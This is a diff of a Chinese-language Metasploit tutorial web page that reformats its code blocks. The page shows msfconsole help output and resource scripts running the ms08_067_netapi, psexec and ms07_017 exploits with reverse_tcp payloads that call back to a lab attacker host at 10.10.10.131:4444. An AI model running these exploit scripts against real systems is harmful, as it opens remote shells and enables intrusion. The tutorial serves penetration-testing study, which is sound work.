@@ -533,290 +533,81 @@
 </li>
 <li>点击鼠标启动</li>
 </ul>
-<pre><code>通用选项:
-    -E, --environment ENVIRONMENT    设置Rails环境，默认为RAIL_ENV环境变量或&#39;生产&#39;
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">通用选项:</span><br><span class="line">    -<span class="ruby">E, --environment ENVIRONMENT    设置Rails环境，默认为RAIL_ENV环境变量或<span class="string">'生产'</span></span></span><br><span class="line"></span><br><span class="line"><span class="ruby">数据库选项<span class="symbol">:</span></span></span><br><span class="line"><span class="ruby">    -M, --migration-path DIRECTORY   指定包含其他数据库迁移的目录</span></span><br><span class="line"><span class="ruby">    -n, --no-database                禁用数据库支持</span></span><br><span class="line"><span class="ruby">    -y, --yaml PATH                  指定一个包含数据库设置的YAML文件</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">框架选项<span class="symbol">:</span></span></span><br><span class="line"><span class="ruby">    -c FILE                          加载指定的配置文件</span></span><br><span class="line"><span class="ruby">    -v, -V, --version                显示版本</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">模块选项<span class="symbol">:</span></span></span><br><span class="line"><span class="ruby">        --defer-<span class="class"><span class="keyword">module</span>-<span class="title">loads</span>         除非明确询问，否则推迟模块加载</span></span></span><br><span class="line"><span class="ruby">    -m, --<span class="class"><span class="keyword">module</span>-<span class="title">path</span> <span class="title">DIRECTORY</span>      加载一个额外的模块路径</span></span></span><br><span class="line"></span><br><span class="line"><span class="ruby">控制台选项<span class="symbol">:</span></span></span><br><span class="line"><span class="ruby">    -a, --ask                        在退出Metasploit之前询问或接受<span class="string">'退出-y'</span></span></span><br><span class="line"><span class="ruby">    -H, --history-file FILE          将命令历史记录保存到指定的文件</span></span><br><span class="line"><span class="ruby">    -L, --real-readline              使用系统Readline库而不是RbReadline</span></span><br><span class="line"><span class="ruby">    -o, --output FILE                输出到指定的文件</span></span><br><span class="line"><span class="ruby">    -p, --plugin PLUGIN              在启动时加载插件</span></span><br><span class="line"><span class="ruby">    -q, --quiet                      不要在启动时显示 banner 信息</span></span><br><span class="line"><span class="ruby">    -r, --resource FILE              执行指定的资源文件（ - 用于stdin）</span></span><br><span class="line"><span class="ruby">    -x, --execute-command COMMAND    执行指定的控制台命令（使用;用于倍数）</span></span><br><span class="line"><span class="ruby">    -h, --help                       显示此消息</span></span><br></pre></td></tr></table></figure>
 
-数据库选项:
-    -M, --migration-path DIRECTORY   指定包含其他数据库迁移的目录
-    -n, --no-database                禁用数据库支持
-    -y, --yaml PATH                  指定一个包含数据库设置的YAML文件
-
-框架选项:
-    -c FILE                          加载指定的配置文件
-    -v, -V, --version                显示版本
-
-模块选项:
-        --defer-module-loads         除非明确询问，否则推迟模块加载
-    -m, --module-path DIRECTORY      加载一个额外的模块路径
-
-控制台选项:
-    -a, --ask                        在退出Metasploit之前询问或接受&#39;退出-y&#39;
-    -H, --history-file FILE          将命令历史记录保存到指定的文件
-    -L, --real-readline              使用系统Readline库而不是RbReadline
-    -o, --output FILE                输出到指定的文件
-    -p, --plugin PLUGIN              在启动时加载插件
-    -q, --quiet                      不要在启动时显示 banner 信息
-    -r, --resource FILE              执行指定的资源文件（ - 用于stdin）
-    -x, --execute-command COMMAND    执行指定的控制台命令（使用;用于倍数）
-    -h, --help                       显示此消息</code></pre><ul>
+<ul>
 <li>进入 msfconsole，查看帮助信息</li>
 </ul>
-<pre><code>root@kali:~# msfconsole
-msf &gt; help
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole</span><br><span class="line">msf &gt; help</span><br><span class="line"></span><br><span class="line">核心命令</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    ?             帮助菜单</span></span><br><span class="line"><span class="code">    banner        显示一个很棒的metasploit横幅</span></span><br><span class="line"><span class="code">    cd            更改当前的工作目录</span></span><br><span class="line"><span class="code">    color         切换高亮显示颜色</span></span><br><span class="line"><span class="code">    connect       连接与主机通信</span></span><br><span class="line"><span class="code">    exit          退出退出控制台</span></span><br><span class="line"><span class="code">    get           获取特定于上下文的变量的值</span></span><br><span class="line"><span class="code">    getg          获取全局变量的值</span></span><br><span class="line"><span class="code">    grep          Grep另一个命令的输出</span></span><br><span class="line"><span class="code">    help          帮助菜单</span></span><br><span class="line"><span class="code">    history       历史显示命令历史</span></span><br><span class="line"><span class="code">    irb           进入irb脚本模式</span></span><br><span class="line"><span class="code">    load          加载一个框架插件</span></span><br><span class="line"><span class="code">    quit          退出控制台</span></span><br><span class="line"><span class="code">    route         路由通过会话路由流量</span></span><br><span class="line"><span class="code">    save          保存保存活动的数据存储</span></span><br><span class="line"><span class="code">    sessions      会话转储会话列表并显示有关会话的信息</span></span><br><span class="line"><span class="code">    set           将特定于上下文的变量设置为一个值</span></span><br><span class="line"><span class="code">    setg          将全局变量设置为一个值</span></span><br><span class="line"><span class="code">    sleep         睡眠在指定的秒数内不执行任何操作</span></span><br><span class="line"><span class="code">    spool         将控制台输出写入文件以及屏幕</span></span><br><span class="line"><span class="code">    threads       线程查看和操作后台线程</span></span><br><span class="line"><span class="code">    unload        卸载卸载框架插件</span></span><br><span class="line"><span class="code">    unset         取消设置取消设置一个或多个特定于上下文的变量</span></span><br><span class="line"><span class="code">    unsetg        取消设置取消设置一个或多个全局变量</span></span><br><span class="line"><span class="code">    version       版本显示框架和控制台库版本号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">模块命令</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    advanced      高级显示一个或多个模块的高级选项</span></span><br><span class="line"><span class="code">    back          返回从当前上下文返回</span></span><br><span class="line"><span class="code">    edit          编辑使用首选编辑器编辑当前模块或文件</span></span><br><span class="line"><span class="code">    info          显示有关一个或多个模块的信息</span></span><br><span class="line"><span class="code">    loadpath      加载路径搜索并加载路径中的模块</span></span><br><span class="line"><span class="code">    options       选项显示全局选项或一个或多个模块</span></span><br><span class="line"><span class="code">    popm          将最新的模块从堆栈弹出并使其处于活动状态</span></span><br><span class="line"><span class="code">    previous      将之前加载的模块设置为当前模块</span></span><br><span class="line"><span class="code">    pushm         将活动或模块列表推入模块堆栈</span></span><br><span class="line"><span class="code">    reload_all    重新加载所有定义的模块路径中的所有模块</span></span><br><span class="line"><span class="code">    reload_lib    从指定路径加载库文件</span></span><br><span class="line"><span class="code">    search        搜索搜索模块名称和说明</span></span><br><span class="line"><span class="code">    show          显示给定类型的模块或所有模块</span></span><br><span class="line"><span class="code">    use           使用按名称选择模块</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">工作命令</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    handler       处理程序作为作业启动负载处理程序</span></span><br><span class="line"><span class="code">    jobs          作业显示和管理作业</span></span><br><span class="line"><span class="code">    kill          杀死一份工作</span></span><br><span class="line"><span class="code">    rename_job    重命名作业</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">资源脚本命令</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    makerc        保存从开始到文件输入的命令</span></span><br><span class="line"><span class="code">    resource      运行存储在文件中的命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">数据库后端命令</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令                描述</span></span><br><span class="line"><span class="code">    -------           -----------</span></span><br><span class="line"><span class="code">    db_connect        连接到现有的数据库</span></span><br><span class="line"><span class="code">    db_disconnect     断开当前数据库实例</span></span><br><span class="line"><span class="code">    db_export         导出包含数据库内容的文件</span></span><br><span class="line"><span class="code">    db_import         导入扫描结果文件（文件类型将被自动检测）</span></span><br><span class="line"><span class="code">    db_nmap           执行nmap并自动记录输出</span></span><br><span class="line"><span class="code">    db_rebuild_cache  重建数据库存储的模块缓存</span></span><br><span class="line"><span class="code">    db_status         显示当前的数据库状态</span></span><br><span class="line"><span class="code">    hosts             列出数据库中的所有主机</span></span><br><span class="line"><span class="code">    loot              列出数据库中的所有战利品</span></span><br><span class="line"><span class="code">    notes             列出数据库中的所有注释</span></span><br><span class="line"><span class="code">    services          列出数据库中的所有服务</span></span><br><span class="line"><span class="code">    vulns             列出数据库中的所有漏洞</span></span><br><span class="line"><span class="code">    workspace         在数据库工作区之间切换</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">凭证后端命令</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    creds         列出数据库中的所有凭据(密码)</span></span><br></pre></td></tr></table></figure>
 
-核心命令
-=============
-
-    命令            描述
-    -------       -----------
-    ?             帮助菜单
-    banner        显示一个很棒的metasploit横幅
-    cd            更改当前的工作目录
-    color         切换高亮显示颜色
-    connect       连接与主机通信
-    exit          退出退出控制台
-    get           获取特定于上下文的变量的值
-    getg          获取全局变量的值
-    grep          Grep另一个命令的输出
-    help          帮助菜单
-    history       历史显示命令历史
-    irb           进入irb脚本模式
-    load          加载一个框架插件
-    quit          退出控制台
-    route         路由通过会话路由流量
-    save          保存保存活动的数据存储
-    sessions      会话转储会话列表并显示有关会话的信息
-    set           将特定于上下文的变量设置为一个值
-    setg          将全局变量设置为一个值
-    sleep         睡眠在指定的秒数内不执行任何操作
-    spool         将控制台输出写入文件以及屏幕
-    threads       线程查看和操作后台线程
-    unload        卸载卸载框架插件
-    unset         取消设置取消设置一个或多个特定于上下文的变量
-    unsetg        取消设置取消设置一个或多个全局变量
-    version       版本显示框架和控制台库版本号
-
-
-模块命令
-===============
-
-    命令            描述
-    -------       -----------
-    advanced      高级显示一个或多个模块的高级选项
-    back          返回从当前上下文返回
-    edit          编辑使用首选编辑器编辑当前模块或文件
-    info          显示有关一个或多个模块的信息
-    loadpath      加载路径搜索并加载路径中的模块
-    options       选项显示全局选项或一个或多个模块
-    popm          将最新的模块从堆栈弹出并使其处于活动状态
-    previous      将之前加载的模块设置为当前模块
-    pushm         将活动或模块列表推入模块堆栈
-    reload_all    重新加载所有定义的模块路径中的所有模块
-    reload_lib    从指定路径加载库文件
-    search        搜索搜索模块名称和说明
-    show          显示给定类型的模块或所有模块
-    use           使用按名称选择模块
-
-
-工作命令
-============
-
-    命令            描述
-    -------       -----------
-    handler       处理程序作为作业启动负载处理程序
-    jobs          作业显示和管理作业
-    kill          杀死一份工作
-    rename_job    重命名作业
-
-
-资源脚本命令
-========================
-
-    命令            描述
-    -------       -----------
-    makerc        保存从开始到文件输入的命令
-    resource      运行存储在文件中的命令
-
-
-数据库后端命令
-=========================
-
-    命令                描述
-    -------           -----------
-    db_connect        连接到现有的数据库
-    db_disconnect     断开当前数据库实例
-    db_export         导出包含数据库内容的文件
-    db_import         导入扫描结果文件（文件类型将被自动检测）
-    db_nmap           执行nmap并自动记录输出
-    db_rebuild_cache  重建数据库存储的模块缓存
-    db_status         显示当前的数据库状态
-    hosts             列出数据库中的所有主机
-    loot              列出数据库中的所有战利品
-    notes             列出数据库中的所有注释
-    services          列出数据库中的所有服务
-    vulns             列出数据库中的所有漏洞
-    workspace         在数据库工作区之间切换
-
-
-凭证后端命令
-============================
-
-    命令            描述
-    -------       -----------
-    creds         列出数据库中的所有凭据(密码)</code></pre><ul>
+<ul>
 <li>msf &gt; help show</li>
 </ul>
-<pre><code>[*]“show” 命令的有效参数是：all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options
-[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</code></pre><ul>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*]“<span class="keyword">show</span>” 命令的有效参数是：<span class="keyword">all</span>, encoders, nops, exploits, payloads, auxiliary, plugins, <span class="keyword">info</span>, <span class="keyword">options</span></span><br><span class="line">[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>msf &gt; help search</li>
 </ul>
-<pre><code>用法: search [keywords]
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">用法</span>: <span class="string">search [keywords]</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Keywords</span>:<span class="string"></span></span><br><span class="line">  <span class="attr">app</span>       :  <span class="string">客户端或服务器攻击的模块</span></span><br><span class="line">  <span class="attr">author</span>    :  <span class="string">本作者编写的模块</span></span><br><span class="line">  <span class="attr">bid</span>       :  <span class="string">具有匹配的Bugtraq ID的模块</span></span><br><span class="line">  <span class="attr">cve</span>       :  <span class="string">具有匹配CVE ID的模块</span></span><br><span class="line">  <span class="attr">edb</span>       :  <span class="string">具有匹配的Exploit-DB ID的模块</span></span><br><span class="line">  <span class="attr">name</span>      :  <span class="string">具有匹配描述性名称的模块</span></span><br><span class="line">  <span class="attr">platform</span>  :  <span class="string">影响这个平台的模块</span></span><br><span class="line">  <span class="attr">ref</span>       :  <span class="string">具有匹配参考的模块</span></span><br><span class="line">  <span class="attr">type</span>      :  <span class="string">特定类型的模块（exploit，auxiliary或post）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">msf</span> <span class="string">&gt; search ms08-067</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">&gt; search name:mysql / type:aux /author:aaron    # 可多条件同时搜索</span></span><br></pre></td></tr></table></figure>
 
-Keywords:
-  app       :  客户端或服务器攻击的模块
-  author    :  本作者编写的模块
-  bid       :  具有匹配的Bugtraq ID的模块
-  cve       :  具有匹配CVE ID的模块
-  edb       :  具有匹配的Exploit-DB ID的模块
-  name      :  具有匹配描述性名称的模块
-  platform  :  影响这个平台的模块
-  ref       :  具有匹配参考的模块
-  type      :  特定类型的模块（exploit，auxiliary或post）
-
-msf &gt; search ms08-067
-msf &gt; search name:mysql / type:aux /author:aaron    # 可多条件同时搜索</code></pre><ul>
+<ul>
 <li>模块内命令</li>
 </ul>
-<pre><code>msf &gt; search ms09_001_write
-msf &gt; use auxiliary/dos/windows/smb/ms09_001_write
-msf auxiliary(dos/windows/smb/ms09_001_write) &gt; info
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search ms09_001_write</span><br><span class="line">msf &gt; use auxiliary<span class="regexp">/dos/</span>windows<span class="regexp">/smb/</span>ms09_001_write</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; info</span><br><span class="line"></span><br><span class="line">[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; show missing</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; show advanced</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; show targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; help edit</span><br><span class="line">    用法：编辑[file <span class="regexp">/ to /</span> edit.rb]</span><br><span class="line">    使用编辑当前活动模块或本地文件。</span><br><span class="line">    如果指定了文件路径，它将在编辑后自动重新加载。</span><br><span class="line">    否则，您可以使用“重新加载”或“重新运行”来重新加载活动模块。</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; edit</span><br></pre></td></tr></table></figure>
 
-[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions
-msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show missing
-msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show advanced
-msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show targets
-
-
-
-msf auxiliary(dos/windows/smb/ms09_001_write) &gt; help edit
-    用法：编辑[file / to / edit.rb]
-    使用编辑当前活动模块或本地文件。
-    如果指定了文件路径，它将在编辑后自动重新加载。
-    否则，您可以使用“重新加载”或“重新运行”来重新加载活动模块。
-msf auxiliary(dos/windows/smb/ms09_001_write) &gt; edit</code></pre><ul>
+<ul>
 <li>数据库操作</li>
 </ul>
-<pre><code>msf &gt; help db_connect 
-    [*]    Usage: db_connect &lt;user:pass&gt;@&lt;host:port&gt;/&lt;database&gt;
-    [*]       OR: db_connect -y [path/to/database.yml]
-    [*] Examples:
-    [*]        db_connect user@metasploit3
-    [*]        db_connect user:pass@192.168.0.2/metasploit3
-    [*]        db_connect user:pass@192.168.0.2:1500/metasploit3
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; <span class="keyword">help</span> db_<span class="keyword">connect</span> </span><br><span class="line">    [*]    Usage: db_<span class="keyword">connect</span> &lt;user<span class="function">:pass</span>&gt;@&lt;host<span class="function">:port</span>&gt;/&lt;database&gt;</span><br><span class="line">    [*]       OR: db_<span class="keyword">connect</span> -y [path/to/database.yml]</span><br><span class="line">    [*] Examples:</span><br><span class="line">    [*]        db_<span class="keyword">connect</span> user@metasploit3</span><br><span class="line">    [*]        db_<span class="keyword">connect</span> user<span class="function">:pass</span>@192.168.0.2/metasploit3</span><br><span class="line">    [*]        db_<span class="keyword">connect</span> user<span class="function">:pass</span>@192.168.0.2<span class="function">:1500</span>/metasploit3</span><br><span class="line"></span><br><span class="line">msf &gt; <span class="keyword">help</span> db_import</span><br><span class="line">    Usage: db_import &lt;filename&gt; [file2.<span class="string">..</span>]</span><br><span class="line">    Filenames can be globs like *<span class="string">.xml</span>, or **/*<span class="string">.xml</span> which will search recursively</span><br><span class="line"></span><br><span class="line">msf &gt; <span class="keyword">help</span> db_export</span><br><span class="line">    Usage:</span><br><span class="line">    db_export -f &lt;format&gt; [filename]</span><br><span class="line">    Format can be one of: xml, pwdump</span><br></pre></td></tr></table></figure>
 
-msf &gt; help db_import
-    Usage: db_import &lt;filename&gt; [file2...]
-    Filenames can be globs like *.xml, or **/*.xml which will search recursively
-
-msf &gt; help db_export
-    Usage:
-    db_export -f &lt;format&gt; [filename]
-    Format can be one of: xml, pwdump</code></pre><ul>
+<ul>
 <li>msf &gt; help sessions<br>Usage: sessions [options] or sessions [id]</li>
 </ul>
-<pre><code>活动的会话操作和交互。
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">活动的会话操作和交互。</span><br><span class="line"></span><br><span class="line">选项:</span><br><span class="line"></span><br><span class="line">    -<span class="ruby">C &lt;opt&gt;  在-i或全部给定的会话上运行Meterpreter命令</span></span><br><span class="line"><span class="ruby">    -K        终止所有会话</span></span><br><span class="line"><span class="ruby">    -S &lt;opt&gt;  行搜索过滤器。</span></span><br><span class="line"><span class="ruby">    -c &lt;opt&gt;  在-i或全部给定的会话上运行命令</span></span><br><span class="line"><span class="ruby">    -h        帮助横幅</span></span><br><span class="line"><span class="ruby">    -i &lt;opt&gt;  与提供的会话ID进行交互</span></span><br><span class="line"><span class="ruby">    -k &lt;opt&gt;  按会话ID和/或范围终止会话</span></span><br><span class="line"><span class="ruby">    -l        列出所有活动会话</span></span><br><span class="line"><span class="ruby">    -n &lt;opt&gt;  按ID命名或重命名会话</span></span><br><span class="line"><span class="ruby">    -q        静音模式</span></span><br><span class="line"><span class="ruby">    -r        重置用-i或全部给定的会话的环形缓冲区</span></span><br><span class="line"><span class="ruby">    -s &lt;opt&gt;  在-i或全部给定的会话上运行脚本或模块</span></span><br><span class="line"><span class="ruby">    -t &lt;opt&gt;  设置响应超时（默认值：<span class="number">15</span>）</span></span><br><span class="line"><span class="ruby">    -u &lt;opt&gt;  在许多平台上将shell升级到meterpreter会话</span></span><br><span class="line"><span class="ruby">    -v        以详细模式列出会话</span></span><br><span class="line"><span class="ruby">    -x        在会话表中显示扩展信息</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">许多选项允许使用逗号和破折号指定会话范围。</span></span><br><span class="line"><span class="ruby">例如:  sessions -s checkvm -i <span class="number">1</span>,<span class="number">3</span>-<span class="number">5</span>  <span class="keyword">or</span>  sessions -k <span class="number">1</span>-<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span></span></span><br></pre></td></tr></table></figure>
 
-选项:
+<h4 id="5-Exploit-模块"><a href="#5-Exploit-模块" class="headerlink" title="5. Exploit 模块"></a>5. Exploit 模块</h4><h5 id="1-Active-exploit"><a href="#1-Active-exploit" class="headerlink" title="1.Active exploit"></a>1.Active exploit</h5><p>攻击者主动连接受害者：</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat ms08067.rb </span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="comment">10.10.10.147</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">RPORT 445</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">PAYLOAD windows</span>/shell/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 10.10.10.131</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT 4444</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-    -C &lt;opt&gt;  在-i或全部给定的会话上运行Meterpreter命令
-    -K        终止所有会话
-    -S &lt;opt&gt;  行搜索过滤器。
-    -c &lt;opt&gt;  在-i或全部给定的会话上运行命令
-    -h        帮助横幅
-    -i &lt;opt&gt;  与提供的会话ID进行交互
-    -k &lt;opt&gt;  按会话ID和/或范围终止会话
-    -l        列出所有活动会话
-    -n &lt;opt&gt;  按ID命名或重命名会话
-    -q        静音模式
-    -r        重置用-i或全部给定的会话的环形缓冲区
-    -s &lt;opt&gt;  在-i或全部给定的会话上运行脚本或模块
-    -t &lt;opt&gt;  设置响应超时（默认值：15）
-    -u &lt;opt&gt;  在许多平台上将shell升级到meterpreter会话
-    -v        以详细模式列出会话
-    -x        在会话表中显示扩展信息
+<p><img src="https://i.imgur.com/rNO4Mud.png" alt="img"></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat psexec.rb </span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="comment">10.10.10.148</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">PAYLOAD windows</span>/shell/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 10.10.10.131</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT 4444</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBUSER Administrator</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBPASS 123456</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-许多选项允许使用逗号和破折号指定会话范围。
-例如:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6</code></pre><h4 id="5-Exploit-模块"><a href="#5-Exploit-模块" class="headerlink" title="5. Exploit 模块"></a>5. Exploit 模块</h4><h5 id="1-Active-exploit"><a href="#1-Active-exploit" class="headerlink" title="1.Active exploit"></a>1.Active exploit</h5><p>攻击者主动连接受害者：</p>
-<pre><code>root@kali:~# cat ms08067.rb 
-use exploit/windows/smb/ms08_067_netapi
-set RHOST 10.10.10.147
-set RPORT 445
-set PAYLOAD windows/shell/reverse_tcp
-set LHOST 10.10.10.131
-set LPORT 4444
-exploit</code></pre><p><img src="https://i.imgur.com/rNO4Mud.png" alt="img"></p>
-<pre><code>root@kali:~# cat psexec.rb 
-use exploit/windows/smb/psexec
-set RHOST 10.10.10.148
-set PAYLOAD windows/shell/reverse_tcp
-set LHOST 10.10.10.131
-set LPORT 4444
-set SMBUSER Administrator
-set SMBPASS 123456
-exploit</code></pre><p><img src="https://i.imgur.com/ctvHDYR.png" alt="img"></p>
+<p><img src="https://i.imgur.com/ctvHDYR.png" alt="img"></p>
 <h5 id="2-Passive-Exploits"><a href="#2-Passive-Exploits" class="headerlink" title="2. Passive Exploits"></a>2. Passive Exploits</h5><p>攻击者等待受害者来触发连接，反弹到攻击者</p>
-<pre><code>root@kali:~# cat ms07017.rb 
-use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
-set URIPATH /
-set SRVHOST 0.0.0.0
-set PAYLOAD windows/shell/reverse_tcp
-set EXITFUNC thread
-set LHOST 10.10.10.131
-set LPORT 4444
-exploit</code></pre><p><img src="https://i.imgur.com/meKMAdB.png" alt="img"></p>
